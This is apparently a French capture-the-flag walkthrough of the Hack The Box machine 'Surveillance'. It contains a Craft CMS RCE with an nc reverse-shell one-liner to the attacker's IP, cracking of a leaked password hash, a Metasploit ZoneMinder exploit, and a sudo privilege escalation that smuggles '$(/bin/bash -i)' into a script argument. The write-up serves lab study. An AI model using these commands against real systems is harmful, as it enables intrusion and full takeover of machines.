  # Surveillance

	echo "10.10.11.245 surveillance.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.245 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.245 -oN nmap.txt
	feroxbuster --silent -u http://surveillance.htb
	
Scans classiques.

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)


http://surveillance.htb/admin/login => Craft CMS 4.4.14

Il y a un CVE : https://blog.calif.io/p/craftcms-rce


    python3 exploit.py http://surveillance.htb/
    > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.39 9999 >/tmp/f
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    

## Pivoting

Fichier SQL dans les backups => Hash de Matthew

    cd ~/html/craft/storage/backups
    
    python3 -m http.server 8000
    wget http://10.10.11.245:8000/surveillance--2023-10-17-202801--v4.4.14.sql.zip
    
    unzip "surveillance--2023-10-17-202801--v4.4.14.sql.zip"
    cat *.sql
    
> INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');

    hashid -m '39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec'
    
CrackStation => OK

	ssh matthew@10.10.11.245
	cat user.txt

## Élévation de privilèges

Site web interne avec ZoneMinder qui tourne sur le port 8080. Il y a un CVE qui permet de l'exécution de commandes : https://pentest-tools.com/vulnerabilities-exploits/zoneminder-snapshots-command-injection_22437
    
    ls /etc/nginx/sites-enabled/
    cat /etc/nginx/sites-enabled/zoneminder.conf
    netstat -pentula

Port forwarding : 

    ssh -L 9999:127.0.0.1:8080 matthew@10.10.11.245

Utilisation de Metasploit pour le CVE existant : 

    msfconsole
    msf6 > search zoneminder
    msf6 > use 1
    msf6 > show missing
    msf6 > set RHOST 127.0.0.1
    msf6 > set RPORT 9999
    msf6 > set LHOST 10.10.16.39
    msf6 > set targeturi /
    msf6 > set ForceExploit true
    msf6 > run
    meterpreter > shell 
    
On obtient bien un shell en tant que "zoneminder"

    python3 -c "import pty;pty.spawn('/bin/bash')"
    sudo -l 
    
> (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *

On peut retrouver le mot de passe de ce compte dans ces scripts.

Le script zmupdate.pl contient une injection de commande basique : 

    sudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023
    
	whoami
	cat /root/root.txt
